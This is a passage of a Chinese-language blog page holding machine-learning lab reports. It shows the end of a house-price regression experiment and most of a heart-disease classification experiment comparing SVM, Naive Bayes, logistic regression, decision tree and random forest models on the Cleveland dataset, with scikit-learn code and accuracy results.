class="string">&quot;results/kc_house_price_prediction.csv&quot;</span>)</span><br><span class="line">price_prediction_rfe.to_csv(<span class="string">&quot;results/kc_house_price_prediction_no_features.csv&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>根据选定的特征进行房价预测，并将预测结果与其他相关数据进行合并。然后，将合并后的数据保存为名为”kc_house_price_prediction.csv”的CSV文件。<br>最后，将price_prediction_rfe保存为名为”kc_house_price_prediction_no_features.csv”的CSV文件。</p>
<h1 id="四、实验结果-1"><a href="#四、实验结果-1" class="headerlink" title="四、实验结果"></a>四、实验结果</h1><p>首先，对多元线性回归模型、递归特征消除、交叉验证的递归特征消除等回归模型分别进行测试，比较出在预测房价上表现的最好的最稳定的模型：RFE线性回归模型。<br>其次，通过建立好的RFE线性回归模型进行未知房价的数据集的房价预测，得到房价预测表。</p>
<h1 id="五、实验分析-1"><a href="#五、实验分析-1" class="headerlink" title="五、实验分析"></a>五、实验分析</h1><p>此次实验，在多个模型上进行了优劣对比，但在模型考察上只使用了均方根误差（RMSE），往后可以考虑用更多评价指标来对模型进行评估，以此获得更加全面的模型报告。</p>
<h1 id="实验三"><a href="#实验三" class="headerlink" title="实验三"></a>实验三</h1><h1 id="一、实验目的-2"><a href="#一、实验目的-2" class="headerlink" title="一、实验目的"></a>一、实验目的</h1><p>(1) 编写程序，实现心脏病的预测模型的建立。<br>(2) 对多个模型，依据混淆矩阵进行评估度量。<br>(3) 写出实验报告。</p>
<h1 id="二、实验原理-2"><a href="#二、实验原理-2" class="headerlink" title="二、实验原理"></a>二、实验原理</h1><p>(1)数据预处理：首先，对心脏病数据集进行数据预处理，包括特征选择、缺失值处理、数据标准化等操作，以准备数据集用于模型训练和测试。 </p>
<p>(2)模型训练：选择了多个机器学习算法，包括SVM、朴素贝叶斯、逻辑回归、决策树、随机森林、LightGBM和XGBoost。对于每个算法，使用训练集对模型进行训练，调整算法参数以获得最佳性能。  </p>
<p>(3)模型评估：使用测试集对训练好的模型进行预测，并计算评估指标：混淆矩阵。  </p>
<p>(4)结果分析：根据实验结果，对不同算法的预测性能进行比较和分析，以确定哪种算法在心脏病预测任务中表现最好</p>
<h1 id="三、实验内容和步骤-2"><a href="#三、实验内容和步骤-2" class="headerlink" title="三、实验内容和步骤"></a>三、实验内容和步骤</h1><h2 id="1-实验内容-2"><a href="#1-实验内容-2" class="headerlink" title="(1)实验内容"></a>(1)实验内容</h2><ol>
<li>数据预处理：对心脏病数据集进行特征选择、缺失值处理、数据标准化等预处理操作。</li>
<li>模型训练：使用SVM、朴素贝叶斯、逻辑回归、决策树、随机森林、LightGBM和XGBoost等算法进行模型训练。</li>
<li>模型评估：使用测试集对训练好的模型进行预测，并计算评估指标，混淆矩阵。</li>
<li>结果比较和分析：对不同算法的预测性能进行比较和分析，以确定最佳的模型。</li>
<li>结论：总结实验结果，给出针对心脏病预测任务的最佳模型选择和建议。</li>
</ol>
<h2 id="2-实验步骤-2"><a href="#2-实验步骤-2" class="headerlink" title="(2)实验步骤"></a>(2)实验步骤</h2><ol>
<li>导入数据并判断是否有缺省值</li>
<li>数据预处理</li>
<li>模型训练与评估</li>
</ol>
<p>具体步骤：</p>
<h3 id="1-导入数据并判断是否有缺省值"><a href="#1-导入数据并判断是否有缺省值" class="headerlink" title="1. 导入数据并判断是否有缺省值"></a>1. 导入数据并判断是否有缺省值</h3><p>具体代码如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"></span><br><span class="line"><span class="comment"># import warnings filter</span></span><br><span class="line"><span class="keyword">from</span> warnings <span class="keyword">import</span> simplefilter</span><br><span class="line"><span class="comment"># ignore all future warnings</span></span><br><span class="line">simplefilter(action=<span class="string">&#x27;ignore&#x27;</span>, category = FutureWarning)</span><br><span class="line"><span class="comment"># import warnings filter</span></span><br><span class="line"><span class="keyword">from</span> warnings <span class="keyword">import</span> simplefilter</span><br><span class="line"><span class="comment"># ignore all future warnings</span></span><br><span class="line">simplefilter(action=<span class="string">&#x27;ignore&#x27;</span>, category = FutureWarning)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">df = pd.read_csv(<span class="string">&#x27;cleveland.csv&#x27;</span>, header = <span class="literal">None</span>)</span><br><span class="line"></span><br><span class="line">df.columns = [<span class="string">&#x27;age&#x27;</span>, <span class="string">&#x27;sex&#x27;</span>, <span class="string">&#x27;cp&#x27;</span>, <span class="string">&#x27;trestbps&#x27;</span>, <span class="string">&#x27;chol&#x27;</span>,</span><br><span class="line">              <span class="string">&#x27;fbs&#x27;</span>, <span class="string">&#x27;restecg&#x27;</span>, <span class="string">&#x27;thalach&#x27;</span>, <span class="string">&#x27;exang&#x27;</span>,</span><br><span class="line">              <span class="string">&#x27;oldpeak&#x27;</span>, <span class="string">&#x27;slope&#x27;</span>, <span class="string">&#x27;ca&#x27;</span>, <span class="string">&#x27;thal&#x27;</span>, <span class="string">&#x27;target&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">### 1 = male, 0 = female</span></span><br><span class="line">df.isnull().<span class="built_in">sum</span>()</span><br></pre></td></tr></table></figure>
<p>输出结果：<br><img src="https://images-1314484890.cos.ap-nanjing.myqcloud.com/Obsidian/202306042345434.png" alt="image.png"></p>
<p>查看每个目标阶层的年龄和性别分布<br>具体代码如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">df[<span class="string">&#x27;target&#x27;</span>] = df.target.<span class="built_in">map</span>(&#123;<span class="number">0</span>: <span class="number">0</span>, <span class="number">1</span>: <span class="number">1</span>, <span class="number">2</span>: <span class="number">1</span>, <span class="number">3</span>: <span class="number">1</span>, <span class="number">4</span>: <span class="number">1</span>&#125;)</span><br><span class="line">df[<span class="string">&#x27;sex&#x27;</span>] = df.sex.<span class="built_in">map</span>(&#123;<span class="number">0</span>: <span class="string">&#x27;female&#x27;</span>, <span class="number">1</span>: <span class="string">&#x27;male&#x27;</span>&#125;)</span><br><span class="line">df[<span class="string">&#x27;thal&#x27;</span>] = df.thal.fillna(df.thal.mean())</span><br><span class="line">df[<span class="string">&#x27;ca&#x27;</span>] = df.ca.fillna(df.ca.mean())</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="keyword">import</span> seaborn <span class="keyword">as</span> sns</span><br><span class="line"></span><br><span class="line"><span class="comment"># distribution of target vs age</span></span><br><span class="line">sns.set_context(<span class="string">&quot;paper&quot;</span>, font_scale = <span class="number">2</span>, rc = &#123;<span class="string">&quot;font.size&quot;</span>: <span class="number">20</span>,<span class="string">&quot;axes.titlesize&quot;</span>: <span class="number">25</span>,<span class="string">&quot;axes.labelsize&quot;</span>: <span class="number">20</span>&#125;) </span><br><span class="line">sns.catplot(kind = <span class="string">&#x27;count&#x27;</span>, data = df, x = <span class="string">&#x27;age&#x27;</span>, hue = <span class="string">&#x27;target&#x27;</span>, order = df[<span class="string">&#x27;age&#x27;</span>].sort_values().unique())</span><br><span class="line">plt.title(<span class="string">&#x27;Variation of Age for each target class&#x27;</span>)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure>
<p>输出结果：<br><img src="https://images-1314484890.cos.ap-nanjing.myqcloud.com/Obsidian/202306042345435.png" alt="image.png"></p>
<p>具体代码如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment"># barplot of age vs sex with hue = target</span></span><br><span class="line">sns.catplot(kind = <span class="string">&#x27;bar&#x27;</span>, data = df, y = <span class="string">&#x27;age&#x27;</span>, x = <span class="string">&#x27;sex&#x27;</span>, hue = <span class="string">&#x27;target&#x27;</span>)</span><br><span class="line">plt.title(<span class="string">&#x27;Distribution of age vs sex with the target class&#x27;</span>)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure>
<p>输出结果：<br><img src="https://images-1314484890.cos.ap-nanjing.myqcloud.com/Obsidian/202306042345436.png" alt="image.png"></p>
<h3 id="2-数据预处理"><a href="#2-数据预处理" class="headerlink" title="2. 数据预处理"></a>2. 数据预处理</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">################################## data preprocessing</span></span><br><span class="line">X = df.iloc[:, :-<span class="number">1</span>].values</span><br><span class="line">y = df.iloc[:, -<span class="number">1</span>].values</span><br><span class="line"><span class="keyword">from</span> sklearn.model_selection <span class="keyword">import</span> train_test_split</span><br><span class="line">X_train, X_test, y_train, y_test = train_test_split(X, y, test_size = <span class="number">0.2</span>, random_state = <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> sklearn.preprocessing <span class="keyword">import</span> StandardScaler <span class="keyword">as</span> ss</span><br><span class="line">sc = ss()</span><br><span class="line">X_train = sc.fit_transform(X_train)</span><br><span class="line">X_test = sc.transform(X_test)</span><br></pre></td></tr></table></figure>
<p><strong>代码解析：</strong></p>
<ol>
<li><p>数据划分：使用<code>train_test_split</code>函数将数据集<code>df</code>划分为训练集和测试集。<code>X</code>是除了最后一列外的所有特征，<code>y</code>是最后一列的目标变量。通过设置<code>test_size</code>参数为0.2，将数据集划分为80%的训练集和20%的测试集。<code>random_state</code>参数用于设定随机种子，以确保每次划分结果的一致性。</p>
</li>
<li><p>特征缩放：使用<code>StandardScaler</code>类进行特征缩放。<code>sc</code>对象是<code>StandardScaler</code>的实例。首先，<code>fit_transform</code>方法在训练集上进行拟合和转换，计算每个特征的均值和标准差，并将训练集进行标准化处理。然后，使用<code>transform</code>方法将测试集按照相同的均值和标准差进行标准化处理。</p>
</li>
</ol>
<p>通过数据划分和特征缩放，可以将原始数据集划分为训练集和测试集，并对特征进行标准化处理，以便在后续的模型训练和评估中使用。这些步骤有助于确保模型在相同的数据范围内进行训练和测试，提高模型的性能和泛化能力。</p>
<h3 id="3-模型训练与评估"><a href="#3-模型训练与评估" class="headerlink" title="3. 模型训练与评估"></a>3. 模型训练与评估</h3><p>应用以下模型进行训练，并且使用混淆矩阵进行模型评估与度量<br>以下模型将具体使用<br>$$accuracy&#x3D;\frac{TP+TN}{TP+TN+FP+FN}$$<br>作为模型的评估度量<br>混淆矩阵如下图所示：<br><img src="https://images-1314484890.cos.ap-nanjing.myqcloud.com/Obsidian/202306042345437.png" alt="image.png"></p>
<h4 id="3-1-SVM-支持向量机"><a href="#3-1-SVM-支持向量机" class="headerlink" title="3.1 SVM(支持向量机)"></a>3.1 SVM(支持向量机)</h4><p><strong>代码解析：</strong></p>
<ol>
<li>模型训练：使用<code>SVC</code>类创建一个SVM分类器对象。<code>kernel=&#39;rbf&#39;</code>参数指定了使用径向基函数作为核函数。然后，使用<code>fit</code>方法将训练集的特征<code>X_train</code>和标签<code>y_train</code>作为输入，对分类器进行训练。</li>
<li>预测测试集结果：使用训练好的分类器对测试集的特征<code>X_test</code>进行预测，使用<code>predict</code>方法得到预测的类别标签<code>y_pred</code>。</li>
<li>混淆矩阵：使用<code>confusion_matrix</code>函数计算测试集预测结果的混淆矩阵。</li>
<li>预测训练集结果和混淆矩阵：类似地，使用训练好的分类器对训练集的特征<code>X_train</code>进行预测，得到预测的类别标签<code>y_pred_train</code>。然后使用<code>confusion_matrix</code>函数计算训练集预测结果的混淆矩阵。</li>
</ol>
<p>具体代码如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#########################################   SVM   #############################################################</span></span><br><span class="line"><span class="keyword">from</span> sklearn.svm <span class="keyword">import</span> SVC</span><br><span class="line">classifier = SVC(kernel = <span class="string">&#x27;rbf&#x27;</span>)</span><br><span class="line">classifier.fit(X_train, y_train)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Predicting the Test set results</span></span><br><span class="line">y_pred = classifier.predict(X_test)</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> sklearn.metrics <span class="keyword">import</span> confusion_matrix</span><br><span class="line">cm_test = confusion_matrix(y_pred, y_test)</span><br><span class="line"></span><br><span class="line">y_pred_train = classifier.predict(X_train)</span><br><span class="line">cm_train = confusion_matrix(y_pred_train, y_train)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Accuracy for training set for svm = &#123;&#125;&#x27;</span>.<span class="built_in">format</span>((cm_train[<span class="number">0</span>][<span class="number">0</span>] + cm_train[<span class="number">1</span>][<span class="number">1</span>])/<span class="built_in">len</span>(y_train)))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Accuracy for test set for svm = &#123;&#125;&#x27;</span>.<span class="built_in">format</span>((cm_test[<span class="number">0</span>][<span class="number">0</span>] + cm_test[<span class="number">1</span>][<span class="number">1</span>])/<span class="built_in">len</span>(y_test)))</span><br></pre></td></tr></table></figure>
<p>输出结果：<br><code>Accuracy for training set for svm = 0.9256198347107438 </code><br><code>Accuracy for test set for svm = 0.8032786885245902</code></p>
<h4 id="3-2-Naive-Bayes-朴素贝叶斯"><a href="#3-2-Naive-Bayes-朴素贝叶斯" class="headerlink" title="3.2 Naive Bayes(朴素贝叶斯)"></a>3.2 Naive Bayes(朴素贝叶斯)</h4><p><strong>代码解析：</strong></p>
<ol>
<li>数据准备：使用<code>df.iloc[:, :-1].values</code>将数据集中除了最后一列之外的所有特征赋值给<code>X</code>，将最后一列的标签赋值给<code>y</code>。</li>
<li>数据划分：使用<code>train_test_split</code>函数将数据集划分为训练集和测试集。通过设置<code>test_size</code>参数为0.2，将数据集划分为80%的训练集和20%的测试集。<code>random_state</code>参数用于设定随机种子，以确保每次划分结果的一致性。划分后的训练集特征赋值给<code>X_train</code>，训练集标签赋值给<code>y_train</code>，测试集特征赋值给<code>X_test</code>，测试集标签赋值给<code>y_test</code>。</li>
<li>模型训练：使用<code>GaussianNB</code>类创建一个朴素贝叶斯分类器对象，即高斯朴素贝叶斯分类器。然后，使用<code>fit</code>方法将训练集的特征<code>X_train</code>和标签<code>y_train</code>作为输入，对分类器进行训练。</li>
<li>预测测试集结果：使用训练好的分类器对测试集的特征<code>X_test</code>进行预测，使用<code>predict</code>方法得到预测的类别标签<code>y_pred</code>。</li>
<li>混淆矩阵：使用<code>confusion_matrix</code>函数计算测试集预测结果的混淆矩阵。</li>
<li>预测训练集结果和混淆矩阵：类似地，使用训练好的分类器对训练集的特征<code>X_train</code>进行预测，得到预测的类别标签<code>y_pred_train</code>。然后使用<code>confusion_matrix</code>函数计算训练集预测结果的混淆矩阵。</li>
</ol>
<p>具体代码如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#########################################   Naive Bayes  #############################################################</span></span><br><span class="line">X = df.iloc[:, :-<span class="number">1</span>].values</span><br><span class="line">y = df.iloc[:, -<span class="number">1</span>].values</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> sklearn.model_selection <span class="keyword">import</span> train_test_split</span><br><span class="line">X_train, X_test, y_train, y_test = train_test_split(X, y, test_size = <span class="number">0.2</span>, random_state = <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> sklearn.naive_bayes <span class="keyword">import</span> GaussianNB</span><br><span class="line">classifier = GaussianNB()</span><br><span class="line">classifier.fit(X_train, y_train)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Predicting the Test set results</span></span><br><span class="line">y_pred = classifier.predict(X_test)</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> sklearn.metrics <span class="keyword">import</span> confusion_matrix</span><br><span class="line">cm_test = confusion_matrix(y_pred, y_test)</span><br><span class="line"></span><br><span class="line">y_pred_train = classifier.predict(X_train)</span><br><span class="line">cm_train = confusion_matrix(y_pred_train, y_train)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Accuracy for training set for Naive Bayes = &#123;&#125;&#x27;</span>.<span class="built_in">format</span>((cm_train[<span class="number">0</span>][<span class="number">0</span>] + cm_train[<span class="number">1</span>][<span class="number">1</span>])/<span class="built_in">len</span>(y_train)))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Accuracy for test set for Naive Bayes = &#123;&#125;&#x27;</span>.<span class="built_in">format</span>((cm_test[<span class="number">0</span>][<span class="number">0</span>] + cm_test[<span class="number">1</span>][<span class="number">1</span>])/<span class="built_in">len</span>(y_test)))</span><br><span class="line"></span><br><span class="line"> </span><br></pre></td></tr></table></figure>
<p>输出结果：<br><code>Accuracy for training set for Naive Bayes = 0.8677685950413223</code><br><code>Accuracy for test set for Naive Bayes = 0.7868852459016393</code></p>
<h4 id="3-3-Logistic-Regression-逻辑回归"><a href="#3-3-Logistic-Regression-逻辑回归" class="headerlink" title="3.3 Logistic Regression(逻辑回归)"></a>3.3 Logistic Regression(逻辑回归)</h4><p><strong>代码解析：</strong></p>
<ol>
<li>数据准备：使用<code>df.iloc[:, :-1].values</code>将数据集中除了最后一列之外的所有特征赋值给<code>X</code>，将最后一列的标签赋值给<code>y</code>。</li>
<li>数据划分：使用<code>train_test_split</code>函数将数据集划分为训练集和测试集。通过设置<code>test_size</code>参数为0.2，将数据集划分为80%的训练集和20%的测试集。<code>random_state</code>参数用于设定随机种子，以确保每次划分结果的一致性。划分后的训练集特征赋值给<code>X_train</code>，训练集标签赋值给<code>y_train</code>，测试集特征赋值给<code>X_test</code>，测试集标签赋值给<code>y_test</code>。</li>
<li>模型训练：使用<code>LogisticRegression</code>类创建一个逻辑回归分类器对象。然后，使用<code>fit</code>方法将训练集的特征<code>X_train</code>和标签<code>y_train</code>作为输入，对分类器进行训练。</li>
<li>预测测试集结果：使用训练好的分类器对测试集的特征<code>X_test</code>进行预测，使用<code>predict</code>方法得到预测的类别标签<code>y_pred</code>。</li>
<li>混淆矩阵：使用<code>confusion_matrix</code>函数计算测试集预测结果的混淆矩阵。</li>
<li>预测训练集结果和混淆矩阵：类似地，使用训练好的分类器对训练集的特征<code>X_train</code>进行预测，得到预测的类别标签<code>y_pred_train</code>。然后使用<code>confusion_matrix</code>函数计算训练集预测结果的混淆矩阵。</li>
</ol>
<p>具体代码如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">#########################################   Logistic Regression  #############################################################</span></span><br><span class="line">X = df.iloc[:, :-<span class="number">1</span>].values</span><br><span class="line">y = df.iloc[:, -<span class="number">1</span>].values</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> sklearn.model_selection <span class="keyword">import</span> train_test_split</span><br><span class="line">X_train, X_test, y_train, y_test = train_test_split(X, y, test_size = <span class="number">0.2</span>, random_state = <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> sklearn.linear_model <span class="keyword">import</span> LogisticRegression</span><br><span class="line">classifier = LogisticRegression()</span><br><span class="line">classifier.fit(X_train, y_train)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Predicting the Test set results</span></span><br><span class="line">y_pred = classifier.predict(X_test)</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> sklearn.metrics <span class="keyword">import</span> confusion_matrix</span><br><span class="line">cm_test = confusion_matrix(y_pred, y_test)</span><br><span class="line"></span><br><span class="line">y_pred_train = classifier.predict(X_train)</span><br><span class="line">cm_train = confusion_matrix(y_pred_train, y_train)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Accuracy for training set for Logistic Regression = &#123;&#125;&#x27;</span>.<span class="built_in">format</span>((cm_train[<span class="number">0</span>][<span class="number">0</span>] + cm_train[<span class="number">1</span>][<span class="number">1</span>])/<span class="built_in">len</span>(y_train)))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Accuracy for test set for Logistic Regression = &#123;&#125;&#x27;</span>.<span class="built_in">format</span>((cm_test[<span class="number">0</span>][<span class="number">0</span>] + cm_test[<span class="number">1</span>][<span class="number">1</span>])/<span class="built_in">len</span>(y_test)))</span><br><span class="line"></span><br><span class="line"> </span><br></pre></td></tr></table></figure>
<p>输出结果：<br><code>Accuracy for training set for Logistic Regression = 0.8677685950413223</code><br><code>Accuracy for test set for Logistic Regression = 0.8032786885245902</code></p>
<h4 id="3-4-Decision-Tree-决策树"><a href="#3-4-Decision-Tree-决策树" class="headerlink" title="3.4 Decision Tree(决策树)"></a>3.4 Decision Tree(决策树)</h4><p><strong>代码解析：</strong></p>
<ol>
<li>数据准备：使用<code>df.iloc[:, :-1].values</code>将数据集中除了最后一列之外的所有特征赋值给<code>X</code>，将最后一列的标签赋值给<code>y</code>。</li>
<li>数据划分：使用<code>train_test_split</code>函数将数据集划分为训练集和测试集。通过设置<code>test_size</code>参数为0.2，将数据集划分为80%的训练集和20%的测试集。<code>random_state</code>参数用于设定随机种子，以确保每次划分结果的一致性。划分后的训练集特征赋值给<code>X_train</code>，训练集标签赋值给<code>y_train</code>，测试集特征赋值给<code>X_test</code>，测试集标签赋值给<code>y_test</code>。</li>
<li>模型训练：使用<code>DecisionTreeClassifier</code>类创建一个决策树分类器对象。然后，使用<code>fit</code>方法将训练集的特征<code>X_train</code>和标签<code>y_train</code>作为输入，对分类器进行训练。</li>
<li>预测测试集结果：使用训练好的分类器对测试集的特征<code>X_test</code>进行预测，使用<code>predict</code>方法得到预测的类别标签<code>y_pred</code>。</li>
<li>混淆矩阵：使用<code>confusion_matrix</code>函数计算测试集预测结果的混淆矩阵。</li>
<li>预测训练集结果和混淆矩阵：类似地，使用训练好的分类器对训练集的特征<code>X_train</code>进行预测，得到预测的类别标签<code>y_pred_train</code>。然后使用<code>confusion_matrix</code>函数计算训练集预测结果的混淆矩阵。</li>
</ol>
<p>具体代码如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#########################################   Decision Tree  #############################################################</span></span><br><span class="line">X = df.iloc[:, :-<span class="number">1</span>].values</span><br><span class="line">y = df.iloc[:, -<span class="number">1</span>].values</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> sklearn.model_selection <span class="keyword">import</span> train_test_split</span><br><span class="line">X_train, X_test, y_train, y_test = train_test_split(X, y, test_size = <span class="number">0.2</span>, random_state = <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> sklearn.tree <span class="keyword">import</span> DecisionTreeClassifier</span><br><span class="line">classifier = DecisionTreeClassifier()</span><br><span class="line">classifier.fit(X_train, y_train)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Predicting the Test set results</span></span><br><span class="line">y_pred = classifier.predict(X_test)</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> sklearn.metrics <span class="keyword">import</span> confusion_matrix</span><br><span class="line">cm_test = confusion_matrix(y_pred, y_test)</span><br><span class="line"></span><br><span class="line">y_pred_train = classifier.predict(X_train)</span><br><span class="line">cm_train = confusion_matrix(y_pred_train, y_train)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Accuracy for training set for Decision Tree = &#123;&#125;&#x27;</span>.<span class="built_in">format</span>((cm_train[<span class="number">0</span>][<span class="number">0</span>] + cm_train[<span class="number">1</span>][<span class="number">1</span>])/<span class="built_in">len</span>(y_train)))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Accuracy for test set for Decision Tree = &#123;&#125;&#x27;</span>.<span class="built_in">format</span>((cm_test[<span class="number">0</span>][<span class="number">0</span>] + cm_test[<span class="number">1</span>][<span class="number">1</span>])/<span class="built_in">len</span>(y_test)))</span><br><span class="line"></span><br><span class="line"> </span><br></pre></td></tr></table></figure>
<p>输出结果：<br><code>Accuracy for training set for Decision Tree = 1.0</code><br><code>Accuracy for test set for Decision Tree = 0.8032786885245902</code></p>
<h4 id="3-5-Random-Forest-随机森林"><a href="#3-5-Random-Forest-随机森林" class="headerlink" title="3.5 Random Forest(随机森林)"></a>3.5 Random Forest(随机森林)</h4><p><strong>代码解析：</strong></p>
<ol>
<li>数据准备：使用<code>df.iloc[:, :-1].values</code>将数据集中除了最后一列之外的所有特征赋值给<code>X</code>，将最后一列的标签赋值给<code>y</code>。</li>
<li>数据划分：使用<code>train_test_split</code>函数将数据集划分为训练集和测试集。通过设置<code>test_size</code>参数为0.2，将数据集划分为80%的训练集和20%的测试集。<code>random_state</code>参数用于设定随机种子，以确保每次划分结果的一致性。划分后的训练集特征赋值给<code>X_train</code>，训练集标签赋值给<code>y_train</code>，测试集特征赋值给<code>X_test</code>，测试集标签赋值给<code>y_test</code>。</li>
<li>模型训练：使用<code>RandomForestClassifier</code>类创建一个随机森林分类器对象。通过设置<code>n_estimators</code>参数为10，指定随机森林中树的数量为10。然后，使用<code>fit</code>方法将训练集的特征<code>X_train</code>和标签<code>y_train</code>作为输入，对分类器进行训练。</li>
<li>预测测试集结果：使用训练好的分类器对测试集的特征<code>X_test</code>进行预测，使用<code>predict</code>方法得到预测的类别标签<code>y_pred</code>。</li>
<li>混淆矩阵：使用<code>confusion_matrix</code>函数计算测试集预测结果的混淆矩阵。</li>
<li>预测训练集结果和混淆矩阵：类似地，使用训练好的分类器对训练集的特征<code>X_train</code>进行预测，得到预测的类别标签<code>y_pred_train</code>。然后使用<code>confusion_matrix</code>函数计算训练集预测结果的混淆矩阵。</li>
</ol>
<p>具体代码如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#########################################  Random Forest  #############################################################</span></span><br><span class="line">X = df.iloc[:, :-<span class="number">1</span>].values</span><br><span class="line">y = df.iloc[:, -<span class="number">1</span>].values</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> sklearn.model_selection <span class="keyword">import</span> train_test_split</span><br><span class="line">X_train, X_test, y_train, y_test = train_test_split(X, y, test_size = <span 